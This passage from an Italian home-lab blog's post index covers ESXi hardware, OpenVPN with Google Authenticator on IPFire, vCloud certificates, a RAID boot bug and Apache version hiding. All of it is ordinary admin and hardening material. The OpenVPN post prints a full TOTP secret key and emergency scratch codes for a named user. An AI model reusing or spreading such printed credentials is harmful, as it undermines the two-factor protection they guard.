\u0026gt; 2 x Gigabit LAN ( 2 ethernet Giga + 1 integrata sulla mobo per un totale di 3)\nQuesta configurazione è “completamente” compatibile con VMware vSphere ESXi 5.1, mentre per ESXi 5.5 va installato il driver per il chipset ethernet Realtek RTL 8111E (deprecato).\nQuesto chispet è presente sia sulla scheda di rete a bordo della motherboard, che sulla Delock PCI Express Card dual Ethernet Gigabit.\nPer l’installazione del driver è possibile seguire questa semplice guida scritta da **Paul Braren\n**\nCi sono altre due piccole incompatiblità che ci tengo a segnalare:\n Software Raid Sata ASRock (i dischi sul controller sata vengono rilevati singolarmente anche in caso di Modalità RAID sul BIOS) Sensori scheda madre ASRock (Velocità ventole e Temperature CPU/Chipset non vengono rilevati)  Screenshot whitebox VMDirectPath I/O pass-through:\n\nIl mio consiglio è di cominciare a comprare l’hardware senza esagerare, ad esempio inizialmente 16GB di Ram potrebbero essere già una quantità esauriente.\nSe avete un NAS che esporta storage con i protocolli NFS o iSCSI potete evitare di comprare i dischi e controller RAID per il Datastore delle macchine virtuali (A discapito della velocità di lettura/scrittura).\nL’installazione del sistema operativo ESXi è compatibile con le USB pendrive, quindi il costo di un altro Harddisk può essere risparmiato.\nHo testato personalmente l’installazione di whitebox con VMware vSphere ESXi 5.0/5.1/5.5 su pendrive usb2 e non ho riscontrato alcun problema.\nNaturalmente non voglio fare i conti in tasca a nessuno, quindi a secondo delle vostre esigenze potrete modificare le caratteristiche hardware del virtualizzatore.\nSe avete dubbi, domande o richieste in particolare non esitate a commentare…\n","permalink":"https://www.homelab.it/index.php/2014/03/25/homelab-it-whitebox-vmware-vsphere-esxi-5-5/","summary":"Per studiare il funzionamento dell’ambiente virtuale VMware, mi sono assemblato un virtualizzatore con Hardware di comune utilizzo (Whitebox).\nSe anche voi siete alla ricerca di hardware compatibile per creare il vostro ESXi server potrete prendere spunto dalla mia configurazione.\nLista hardware whitebox esxi 5.5 IMMO Motherboard: Asrock 970 Extreme3 R2.0\nCPU: AMD FX 8350\nRAM: Corsair 32GB DDR3-1600MHz Vengeance Pro_(4x8GB)\nPSU: Seasonic S12II-520 Bronze\nDatastore Storage: 4 x 1TB Seagate ST1000DM003 Barracuda","title":"HomeLab Whitebox – VMware vSphere ESXi 5.5"},{"content":"[UPDATE: 2015-01-07]\nIn questo articolo spiegherò passo dopo passo come modificare la struttura di IPFire 2 per implementare alla configurazione standard di OpenVPN, l’autenticazione OTP (One time Password) di google authenticator.\nPer configurare OpenVPN e google authenticator su IPFire 2.x basta installare il pacchetto da me creato e seguire pochi semplici passi.\nIl pacchetto (i386) e relative istruzioni d\u0026rsquo;installazione sono reperibili qui: http://www.homelab.it/index.php/2014/03/10/libpam-google-authenticator-ipfire-2-x-pack/\nLa procedura che riporterò di seguito è stata testata su IPFire 2.15 Core Update 75 ma con qualche modifica credo che possa essere compatibile anche con le versioni 2.x precedenti.\nPotremmo inserire le implementazioni di google authenticator direttamente nei file di configurazione di OpenVPN, ma nel caso venisse fatta qualche modifica dalla pagina di amministrazione https://indirizzo_ip_ipfire:444/cgi-bin/ovpnmain.cgi , le personalizzazioni andrebbero perse.\nCome ben sappiamo ogni volta che applichiamo qualche modifica dalla web gui, ipfire sovrascrive i relativi file di configurazione.\nPer evitare questo, collegarsi tramite ssh su IPFire ed editare con vim il file:\n/srv/web/ipfire/cgi-bin/ovpnmain.cgi\nPosizionarsi tra la riga n° 187 e 188 inserendo:\n print CONF \u0026quot;plugin /usr/lib/openvpn/openvpn-auth-pam.so openvpn\\n\u0026quot;;\nDopo posizionarsi tra la riga n° 2154 e 2155 ed inserire:\n print CLIENTCONF \u0026quot;auth-user-pass\\r\\n\u0026quot;;\nChiudere il file e salvare le modifiche.\nSempre tramite vim creare il file:\n/etc/pam.d/openvpn\nPrima di salvare il file scrivere al suo interno:\nauth requisite pam_google_authenticator.so forward_pass auth required pam_unix.so use_first_pass account required pam_permit.so In questa maniera configureremo OpenVPN in modo da usufruire dell’autenticazione pam oltre al classico scambio di certificati.\nLe opzioni forward_pass e use_first_pass sono fondamentali per implementare il codice one-time passcode all’autenticazione pam_unix user+pass.\nPer quanto riguarda la configurazione di OpenVPN in modalità Roadwarrior (Client-to-Net) parto dal presupposto che sappiate già come muovervi, se così non fosse vi rimando alla documentazione (wiki) ufficiale: Qui L’ultima parte dell’articolo riguarda la creazione dell’utente vpn, ad esempio claudiovpn .\nPrima di tutto va creato l’utente e relativo certificato tramite la web-gui di IPFire:\nhttps://indirizzo_ip_ipfire:444/cgi-bin/ovpnmain.cgi\n\nDopo, tramite ssh, creare l’utente di sistema e settare una password:\n[root@firewall ~]# useradd claudiovpn -m [root@firewall ~]# passwd claudiovpn Changing password for claudiovpn Enter the new password (minimum of 5, maximum of 127 characters) Please use a combination of upper and lower case letters and numbers. New password: Re-enter new password: Password changed. [root@firewall ~]# Loggarsi temporaneamente col nuovo utente per creare il token di google:\n[root@firewall ~]# su claudiovpn - [claudiovpn@firewall]$ /usr/local/bin/google-authenticator Do you want authentication tokens to be time-based (y/n) y \u0026lt;--- Rispondere Y https://www.google.com/chart?chs=200x200\u0026amp;chld=M|0\u0026amp;cht=qr\u0026amp;chl=otpauth://totp/claudiovpn@firewall%3Fsecret%3D5MG7M2XNSNJPQHIN Your new secret key is: 5MG7M2XNSNJPQHIN \u0026lt;--- Codice per l\u0026#39;app google che genera il one-time passcode Your verification code is 821553 Your emergency scratch codes are: 48058587 37432228 51593683 26172608 44428685 Do you want me to update your \u0026#34;/home/claudiovpn/.google_authenticator\u0026#34; file (y/n) y \u0026lt;--Rispondere Y Do you want to disallow multiple uses of the same authentication token? This restricts you to one login about every 30s, but it increases your chances to notice or even prevent man-in-the-middle attacks (y/n) y \u0026lt;--- Rispondere come meglio si preferisce By default, tokens are good for 30 seconds and in order to compensate for possible time-skew between the client and the server, we allow an extra token before and after the current time. If you experience problems with poor time synchronization, you can increase the window from its default size of 1:30min to about 4min. Do you want to do so (y/n) n \u0026lt;--- Rispondere come meglio si preferisce If the computer that you are logging into isn\u0026#39;t hardened against brute-force login attempts, you can enable rate-limiting for the authentication module. By default, this limits attackers to no more than 3 login attempts every 30s. Do you want to enable rate-limiting (y/n) y \u0026lt;--- Rispondere come meglio si preferisce [claudiovpn@firewall]$ exit exit [root@firewall ~]# Per rendere ancor più sicuro l’account, editare il file /etc/passwd e cambiare la shell dell’utente appena creato da /bin/bash a /bin/false .\nPer configurare il client OpenVPN, basta scaricare il pacchetto di configurazione del proprio utente dalla pagina: https://indirizzo_ip_ipfire:444/cgi-bin/ovpnmain.cgi cliccando sull’icona del floppy.\nScompattare il contenuto del file zip, un file .ovpn e un cerificato, all’interno della directory di configurazione del client OpenVPN.\nUna volta caricato l’account, dopo aver inizializzato la connessione, ci verranno richieste le credenziali di accesso.\nA questo punto non rimane che inserire la login e la password+one-time passcode.\nAd esempio se la password fosse welcome e il passcode generato 123456, l’autenticaizone sarebbe:\nLogin: claudiovpn Pass: welcome123456 Siamo arrivati alla fine, se avete seguito tutti i passaggi in maniera corretta riuscirete a collegarvi alla VPN.\nPer qualsiasi info o delucidazione commentate pure senza problemi.\n","permalink":"https://www.homelab.it/index.php/2014/03/24/ipfire-2-x-openvpn-google-authenticator/","summary":"[UPDATE: 2015-01-07]\nIn questo articolo spiegherò passo dopo passo come modificare la struttura di IPFire 2 per implementare alla configurazione standard di OpenVPN, l’autenticazione OTP (One time Password) di google authenticator.\nPer configurare OpenVPN e google authenticator su IPFire 2.x basta installare il pacchetto da me creato e seguire pochi semplici passi.\nIl pacchetto (i386) e relative istruzioni d\u0026rsquo;installazione sono reperibili qui: http://www.homelab.it/index.php/2014/03/10/libpam-google-authenticator-ipfire-2-x-pack/\nLa procedura che riporterò di seguito è stata testata su IPFire 2.","title":"IPFire 2.x + OpenVPN + google authenticator"},{"content":"Qualche giorno fa ho avuto la necessità di installare Esxi 5.5 sul Mac Mini 6.2 .\nFacendo varie ricerche mi sono imbattuato in qusto interessantissimo blog dove ho trovato tutto il necessario: Virtually Ghetto\nLe custom iso sono disponibili ai seguenti link:\n ESXi-5.5-Mac-Mini-6.2.iso ESXi-5.5u1-Mac-Mini-6.2.iso  L’installazione che ho scelto è stata quella tramite pendrive usb ed ho utilizzato il tool: UNetbootin\nUNetbootin è semplicissmo da utilizzare, basta eseguire il programma (nessuna installazione), selezionare la pendrive (FORMATTATA FAT32) e l’immagine ISO scaricata.\n\nPer quanto riguarda l’installazione l’unica nota che mi riserbo di dare è che il software raid del Mac Mini non è compatibile con ESXi, a parte questo la procedura d’installazione si può considerare standard.\nUna volta finita l’installazione sicuramente ci saranno problemi nel rilevamaneto dell’adattatore Ethernet Gigabit Thunderbolt.\nPer utilizzare l’adattatore di rete Thunderbolt su ESXi 5.5, sono necessari due requisiti:\n1) Abilitare l’accesso SSH su ESXi 5.5\n2) Scaricare il VIB file vghetto-apple-thunderbolder-ethernet.vib\nIl VIB file va copiato sull’ESXi server tramite scp/WinSCP ( o qualsiasi altro client scp) , ad esempio dentro la cartella /tmp, dopo ci si deve collegare tramite ssh client e digitare il comando:\nesxcli software vib install -v /tmp/vghetto-apple-thunderbolder-ethernet.vib -f\nQui di seguito riporto uno screenshot d’esempio, in questo caso però l’upload del VIB file è stato fatto tramite browser del Datastore (VMware Vsphere Client) quindi il path d’installazione è differente\n\nQuesto è tutto, buona installazione!\n","permalink":"https://www.homelab.it/index.php/2014/03/21/esxi-5-55-5u1-su-apple-mac-mini-6-2/","summary":"Qualche giorno fa ho avuto la necessità di installare Esxi 5.5 sul Mac Mini 6.2 .\nFacendo varie ricerche mi sono imbattuato in qusto interessantissimo blog dove ho trovato tutto il necessario: Virtually Ghetto\nLe custom iso sono disponibili ai seguenti link:\n ESXi-5.5-Mac-Mini-6.2.iso ESXi-5.5u1-Mac-Mini-6.2.iso  L’installazione che ho scelto è stata quella tramite pendrive usb ed ho utilizzato il tool: UNetbootin\nUNetbootin è semplicissmo da utilizzare, basta eseguire il programma (nessuna installazione), selezionare la pendrive (FORMATTATA FAT32) e l’immagine ISO scaricata.","title":"VMware ESXi 5.5/5.5u1 su Apple Mac Mini 6.2"},{"content":"Dato che in giro non ho trovato nessun pacchetto per implementare google authenticator sulla distribuzione ipfire, ho deciso di crearmelo da solo.\nLa versione è compatibile con i sistemi 32bit, ma presto metterò online la versione x64.\nHo testato il pacchetto su IPFire 2 Core-Update-Level: 75 i586\nDownload: libpam-google-authenticator-1.0-1.ipfire\nL’installazione è semplicissima, prima di tutto copiare il file libpam-google-authenticator-1.0-1.ipfire.gz tramite scp,winscp,rsync ecc… all’interno della directory “/opt/pakfire/tmp” poi eseguire i seguenti comandi:\n[root@firewall tmp]# cd /opt/pakfire/tmp/ [root@firewall tmp]# pwd /opt/pakfire/tmp [root@firewall tmp]# ls libpam-google-authenticator-1.0-1.ipfire.gz [root@firewall tmp]# tar xvfz libpam-google-authenticator-1.0-1.ipfire.gz files.tar.xz install.sh ROOTFILES uninstall.sh update.sh [root@firewall tmp]# ./install.sh Extracting files... tar: Record size = 16 blocks lib/ lib/security/ lib/security/pam_google_authenticator.so usr/ usr/local/ usr/local/bin/ usr/local/bin/google-authenticator ...Finished. Restoring Backup... ...Finished. [root@firewall tmp]# rm -rf * [root@firewall tmp]# ls [root@firewall tmp]# Quando vorrete disinstallare il pacchetto, vi basterà riscompattare il pacchetto nella stessa directory ed eseguire lo script uninstall.sh.\nSono riuscito ad implementare e testare questa libreria con OpenVPN, sempre su IPFire, ed a breve rilascerò l’articolo..\nFatemi sapere per cortesia eventuali migliorie da apportare o bug da sistemare…\n","permalink":"https://www.homelab.it/index.php/2014/03/10/libpam-google-authenticator-ipfire-2-x-pack/","summary":"Dato che in giro non ho trovato nessun pacchetto per implementare google authenticator sulla distribuzione ipfire, ho deciso di crearmelo da solo.\nLa versione è compatibile con i sistemi 32bit, ma presto metterò online la versione x64.\nHo testato il pacchetto su IPFire 2 Core-Update-Level: 75 i586\nDownload: libpam-google-authenticator-1.0-1.ipfire\nL’installazione è semplicissima, prima di tutto copiare il file libpam-google-authenticator-1.0-1.ipfire.gz tramite scp,winscp,rsync ecc… all’interno della directory “/opt/pakfire/tmp” poi eseguire i seguenti comandi:","title":"libpam-google-authenticator IPFire 2.x pack"},{"content":"Se anche voi avete deciso di installare e configurare VMware vCloud Director 5.5 sulla vostra distribuzione CentOS, arriverete al punto di dover creare i certificati ssl per la Web GUI e la console proxy.\nPiccola premessa: Se state installando la vApp di VMware vCloud Director, i certificati verranno generati automaticamente.\nil comando è semplice:\n/opt/vmware/vcloud-director/jre/bin/keytool -genkey -keystore /opt/vmware/vcloud-director/data/transfer/certificates.ks -storetype JCEKS -storepass passwd -keyalg RSA -validity 9999 -alias http La sintassi è di facile comprensione, da notare principalmente 3 parti:\n-storepass passwd: Sostituire passwd con la propria password, verrà richiesta\nal momento dell’importazione del certificato durante la\nconfigurazione di vCloud Director.\n-validity 9999 : Scegliere i giorni di validità del certificato\n-alias http : Scegliere il nome alias del certificato, http per webGUI e consoleproxy per la\nconsole proxy\nRicapitolando:\n /opt/vmware/vcloud-director/jre/bin/keytool -genkey -keystore /opt/vmware/vcloud-director/data/transfer/certificates.ks -storetype JCEKS -storepass passwd -keyalg RSA -validity 9999 -alias http /opt/vmware/vcloud-director/jre/bin/keytool -genkey -keystore /opt/vmware/vcloud-director/data/transfer/certificates.ks -storetype JCEKS -storepass passwd -keyalg RSA -validity 9999 -alias consoleproxy  Riferimenti Software per questo post:\nOS: CentOS 6.5\narch: x86_64\nkernel: 2.6.32-431.1.2.0.1\nVMware vCloud Director: vmware-vcloud-director-5.5.0-1323688.bin\nselinux: permissive\n","permalink":"https://www.homelab.it/index.php/2014/01/27/generare-certificati-vmware-vcloud-director-5-5-su-centos/","summary":"Se anche voi avete deciso di installare e configurare VMware vCloud Director 5.5 sulla vostra distribuzione CentOS, arriverete al punto di dover creare i certificati ssl per la Web GUI e la console proxy.\nPiccola premessa: Se state installando la vApp di VMware vCloud Director, i certificati verranno generati automaticamente.\nil comando è semplice:\n/opt/vmware/vcloud-director/jre/bin/keytool -genkey -keystore /opt/vmware/vcloud-director/data/transfer/certificates.ks -storetype JCEKS -storepass passwd -keyalg RSA -validity 9999 -alias http La sintassi è di facile comprensione, da notare principalmente 3 parti:","title":"Generare certificati per VMware vCloud Director 5.5 su CentOS"},{"content":"loading module megaraid_sas bug Ciao a tutti,\nSe siete arrivati in questa pagina è perchè probabilmente anche voi siete incappati nella schermata che blocca il boot di esxi 5.x con il messaggio: loading module megaraid_sas\n\nQuesto problema viene scaturito dall’utilizzo del controller raid LSI Megaraid 9240-8i su motherboards non supportate (come da specifiche) in particolare su workstation.\nIo ho eseguito dei test con la motherboard ASRock 970 extreme3 R2.0 con il bios versione 1.30 e 1.40 senza ottenere buoni risultati.\nFacendo varie ricerce sembrerebbe che per far funzionare il tutto si debba configurare il bios della motherboard in modo da far partire il controller raid PCI-Express in modalità UEFI.\nMi sono messo in contatto anche con il supporto di ASRock e mi hanno consigliato di modificare l’opzione nel bios “CSM” in “Disabled“.\nPurtroppo anche questo test è fallito miseramente…\nHo letto di prove fallite su mobo Asus Z77, h67, h87, h61 mentre sembrerebbe funzionare con le Gigabyte settando l’opzione nel bios: Option ROM = “EFI Compatible ROM ”\nI miei test continueranno…se avrò altre info le scriverò qui di seguito..\nNaturalmente se avete info o suggerimenti commentate pure!\n","permalink":"https://www.homelab.it/index.php/2014/01/09/lsi-megaraid-9240-8i-esxi-5-x-loading-module-megaraid_sas-esxi-5/","summary":"loading module megaraid_sas bug Ciao a tutti,\nSe siete arrivati in questa pagina è perchè probabilmente anche voi siete incappati nella schermata che blocca il boot di esxi 5.x con il messaggio: loading module megaraid_sas\n\nQuesto problema viene scaturito dall’utilizzo del controller raid LSI Megaraid 9240-8i su motherboards non supportate (come da specifiche) in particolare su workstation.\nIo ho eseguito dei test con la motherboard ASRock 970 extreme3 R2.0 con il bios versione 1.","title":"LSI Megaraid 9240-8i/M1015 + ESXi 5.x = loading module megaraid_sas"},{"content":"Identificare la versione di un demone o di un applicativo è il primo passo che un cracker esegue prima di sferrare l’attacco.\nTengo a precisare che i vari test che andrò a mostrare sono stati effettuati su una CentOS 6 x86_64, ma con le dovute modifiche sono applicabili a qualsiasi distro Linux.\nVediamo quali informazioni di apache possiamo rilevare su una CentOS 6 con le impostazioni di default.\nCome prima cosa andiamo su uno dei tantissimi siti che offrono un servizio online di Web Server Information.\nFacendo una ricerca su google tra i primi possiamo trovare questo: http://browserspy.dk/webserver.php\nInseriamo l’url del server da controllare e consultiamo i risultati della ricerca:\n\nCome si può notare è visibile sia la versione di Apache che quella di PHP.\nMi è stato chiesto di offuscare il più possibile queste informazioni e dopo varie ricerce (con relativi test) ho trovato almeno 4 metodi interessanti:\n Modifica dei paremetri ServerSignature e ServerTokens in httpd.conf Modifica parametro expose_php in php.ini Installazione modulo mod_security Personalizzazione messaggi errore 404 e 403     ServerSignature e ServerTokens sono due opzioni che si trovano nel file di configurazione di apache.\nServerSignature è la firma che il server web Apache inserisce in fondo alle pagine d’errore insieme al nome del virtualhost,\nquindi dovremo impostarla su Off.\nServerTokens è la direttiva che specifica in che modo deve essere visualizzata la versione di Apache all’interno dell’header, l’opzione meno “parlante” è Prod.\nPer eseguire queste modifiche basta editare il file /etc/httpd/conf/httpd.conf , cercare le due opzioni e modificarle in questo\nmodo:ServerSignature Off\nServerTokens ProdChiudiamo il file e salviamo le modifiche.    Per nascondere la versione di PHP che stiamo utilizzando, basta editare il file /etc/php.ini e modificare l’opzione “expose_php = On” in “expose_php = Off”\nA questo punto non ci resta che riavviare apache: service httpd restart    Concluse le modifiche applicabili ai file di configurazione, eseguiamo di nuovo il test Web Server Information e controlliamo i risultati:\n\nSicuramente la situazone è migliorata ma ancora non abbiamo raggiunto il nostro scopo, si legge chiaramente che sul nostro server è presente il demone Apache. Per rimediare a questa mancanza passiamo al punto n°3\n  Il modo migliore per offuscare la versione di Apache, è installare il modulo mod_security.\nmod_security è un Web Application Firewall (Free) che opera a livello HTTP e si frappone tra le richieste del client browser e il server apache. Tra le sue mutlitudini di opzioni, c’è anche la possibilità di offuscare la richiesta header che fa riferimento ai ServerTokens di apache. Per qualsiasi info la pagina ufficiale è questa: http://www.modsecurity.org/\nIl pacchetto mod_security per CentOS 6 lo possiamo trovare nel repository EPEL.Apriamo un terminale con utenza root e digitiamo:   rpm -i http://dl.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm yum install mod_security  Finita l’installazione, editiamo il file /etc/httpd/conf.d/mod_security.conf e aggiungiamo in fondo, prima dell’istruzione, la seguente riga:\nSecServerSignature HTTP_Server\nChiudiamo il file e salviamo le modifiche.\nPer far funzionare il tutto dovremo editare nuovamente il file /etc/httpd/conf/httpd.conf e modificare la direttiva\n“ServerTokens Prod” in “ServerTokens Full“.\nChiudiamo il file, salviamo le modifiche e riavviamo il servizio: service httpd restart\n  Eseguiamo per l’ultima volta il test Web Server Information…rullo di tamburi e…\n\nBene, abbiamo raggiunto lo scopo.\nRubo soltanto un altro minuto per una mia considerazione personale, ovvero il punto n°4\n  A mio parere un’altra modifica importante da fare alla configurazione di apache è quella di sostituire le pagine di risposta 404, 402, 500, ecc.. di default con altre personalizzate.\nQuesto perchè dando un’occhiata alle pagine che forniscono i vari web server al momento dell’installazione, essendo sempre “formattate” allo stesso modo, è possibile capirne la provenienza (Nonostante l’offuscamento della versione).Inserisco tre immagini d’esempio che ho trovato facendo una ricerca su google:  Pagina 404 Apache\n\nPagina 404 nginx\n\nPagina 404 lighttpd\n\nEssendo sempre queste le pagine di default, il maleintenzionato potrebbe trarne informazioni e quindi vantaggio..\nCi sono vari modi di sostituire queste pagine su apache , potete trovare un articolo interessante QUI .\n  Chiudo e vi saluto scrivendo la configurazione della distro con cui ho fatto i test:\nOS: CentOS 6.5\narch: x86_64\nkernel: 2.6.32-431.1.2.0.1\napache: httpd-2.2.15-29\nmod_security: 2.7.3-2\nselinux: enforcing\n","permalink":"https://www.homelab.it/index.php/2013/12/31/apache-security-nascondere-la-versione-di-apache-e-php/","summary":"Identificare la versione di un demone o di un applicativo è il primo passo che un cracker esegue prima di sferrare l’attacco.\nTengo a precisare che i vari test che andrò a mostrare sono stati effettuati su una CentOS 6 x86_64, ma con le dovute modifiche sono applicabili a qualsiasi distro Linux.\nVediamo quali informazioni di apache possiamo rilevare su una CentOS 6 con le impostazioni di default.\nCome prima cosa andiamo su uno dei tantissimi siti che offrono un servizio online di Web Server Information.","title":"Apache Security: Nascondere la versione di Apache e PHP"}]